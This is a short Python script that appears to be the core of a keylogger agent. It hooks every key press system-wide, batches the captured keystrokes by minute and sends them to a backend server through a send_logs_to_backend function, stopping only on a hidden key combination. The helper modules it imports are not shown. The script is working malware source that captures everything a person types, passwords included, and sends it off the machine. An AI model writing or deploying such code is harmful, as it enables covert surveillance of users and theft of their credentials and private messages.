import keyboard
import get_key
from agent.print_keystrokes import send_logs_to_backend
from text_by_minute import key_by_minute
from print_keystrokes import print_key_log
from chek_if_show import check_if_get_show

def call_on_key(e):
    get_key.on_key(e)
    if check_if_get_show(get_key.details_keys):
        r_key_by_minute = key_by_minute(get_key.details_keys)
        send_logs_to_backend(r_key_by_minute)
        get_key.details_keys.clear()

keyboard.on_press(call_on_key)
keyboard.wait("ctrl+shift+g")
